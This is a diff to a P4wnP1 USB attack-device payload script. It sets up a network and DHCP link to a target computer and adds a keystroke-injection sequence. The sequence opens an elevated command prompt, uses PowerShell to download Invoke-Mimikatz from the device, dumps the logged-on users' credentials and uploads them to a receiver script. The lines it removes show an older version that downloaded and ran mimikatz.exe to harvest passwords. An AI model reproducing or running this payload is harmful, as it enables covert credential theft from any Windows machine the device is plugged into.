@@ -12,9 +12,48 @@ USB_PID="0x110c"        # Product ID
 USE_RNDIS=true          # if true RNDIS will be enabled
 USE_HID=true            # if true HID (keyboard) will be enabled
 
+# ==========================
+# Network and DHCP options
+# ==========================
 
+# We choose an IP with a very small subnet (see comments in README.rst)
+IF_IP="172.16.0.1" # IP used by P4wnP1
+IF_MASK="255.255.255.252" 
+IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang
+
+
+# =====================
+# Keyboard config
+# =====================
+# Keyboard language for outhid and duckhid commands
+lang="us"
+USE_HID_TEST=false
 
 # Payload configuration via HID interface
+
+function onNetworkUp()
+{
+	echo "Network up"
+	echo "Active device $active_interface"
+	echo "P4wnP1 IP $IF_IP"
+	echo "P4wnP1 netmask $IF_MASK"
+	echo "Network is running"
+
+	python SimpleHTTPServer 
+}
+
+
+function onTargetGotIP()
+{
+	echo "DHCP Lease given to target"
+	echo "Target IP $target_ip"
+
+ 	# add DNS entry for google DNS
+	echo nameserver 8.8.8.8 > /etc/resolv.conf
+
+	echo "Target got IP $target_ip via DHCP"
+}
+
 
 function onKeyboardUp()
 {
@@ -27,45 +66,27 @@ function onKeyboardUp()
 				DELAY 3000
 				CONTROL ESCAPE
 				DELAY 1000
-				STRING powershell
-				DELAY 1000
-				CTRL-SHIFT ENTER
-				DELAY 1000
+				STRING powershell Start-Process cmd -Verb runAs
+				ENTER
+				DELAY 3000
 				ALT y
-				ENTER
-				DELAY 300
-
-				REM ---- Change the Execution Policy
-				STRING Set-ExecutionPolicy Unrestricted
 				DELAY 500
-				ENTER
-				DELAY 500
-				STRING A
-				DELAY 500
-				ENTER
 
 
+#				REM ---- Change the Execution Policy
+#				STRING Set-ExecutionPolicy Unrestricted
+#				DELAY 500
+#				ENTER
+#				DELAY 500
+#				STRING A
+#				DELAY 500
+#				ENTER
 
-				REM -------------download appropriate mimikatz for architecture
-				STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to 32bit mimikatz.exe','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('http://url to 64bit mimikatz.exe','%TEMP%\pw.exe');}
+				REM ---- Download and run Mimikatz
+				STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1:8000/Invoke-Mimikatz.ps1')"; $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://172.16.0.1/rx.php', $output)"
 				ENTER
-				DELAY 5000
-				REM -------------get the passwords and save to c:\pwlog.txt
-				STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
-				ENTER
-				DELAY 2000
-				STRING privilege::debug
-				ENTER
-				DELAY 1000
-				STRING sekurlsa::logonPasswords full
-				ENTER
-				DELAY 1000
-				STRING exit
-				ENTER
-				DELAY 300
-				STRING del %TEMP%\pw.exe
-				ENTER
-				DELAY 300
+				DELAY 15000
+
 EOF
 
 }
